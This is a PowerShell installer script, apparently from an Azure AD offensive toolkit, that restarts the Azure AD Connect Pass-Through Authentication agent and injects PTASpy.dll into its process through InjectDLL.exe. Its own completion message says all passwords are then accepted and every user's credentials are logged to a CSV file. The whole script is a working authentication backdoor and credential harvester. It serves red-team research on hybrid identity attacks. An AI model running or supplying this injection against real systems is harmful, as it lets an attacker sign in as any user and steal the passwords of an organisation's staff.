<#
    .SYNOPSIS
    This script configures injects PTASpy.dll to AzureADConnectAuthenticationAgent service

    .DESCRIPTION
    This script configures injects PTASpy.dll to AzureADConnectAuthenticationAgent service.
    It is assumed that PTASpy.dll and InjectDLL.exe are located at C:\PTASpy

    .PARAMETER Location
    Directory where PTASpy.dll and InjectDLL.exe are located.

    .\Install-PTASpy.ps1 

    .NOTES
    Version: 1.1
    Author:  @DrAzureAD (Dr Nestori Syynimaa)
    Date:    Sep 19 2022
#>
[cmdletbinding()]
Param(
    [Parameter(Mandatory=$False)]
    [String]$Location="C:\PTASpy"
)


# (Re)start the service
Write-Verbose "* Restarting AzureADConnectAuthenticationAgent service"
Restart-Service "AzureADConnectAuthenticationAgent" -ErrorAction SilentlyContinue

# Check that the process is running..
$process = Get-Process -Name "AzureADConnectAuthenticationAgentService" -ErrorAction SilentlyContinue
if([String]::IsNullOrEmpty($process))
{
    Write-Error "Unable to start Azure AD Authentication Agent (AzureADConnectAuthenticationAgentService.exe)."
    return
}

# Inject dll to process
Write-Verbose "* Injecting PTASpy.dll to pid $($process.Id)"

# Create ProcessStartInfo
$info = New-Object System.Diagnostics.ProcessStartInfo
$info.FileName = "$Location\InjectDLL.exe"
$info.Arguments = "$($process.id) `"$Location\PTASpy.dll`""
$info.CreateNoWindow = $true
$info.RedirectStandardOutput = $true
$info.UseShellExecute = $false

# Create a new process and execute it
$ps = New-Object System.Diagnostics.Process
$ps.StartInfo = $info
$ps.Start() | Out-Null
$ps.WaitForExit()

# Read the results
$result = $ps.StandardOutput.ReadToEnd()

if($result -like "*success*")
{
    Write-Host "Installation successfully completed!"
    Write-Host "All passwords are now accepted and credentials collected to $Location\PTASpy.csv"
    return
}
else
{
    Write-Error "Installation failed: $result"
    return
}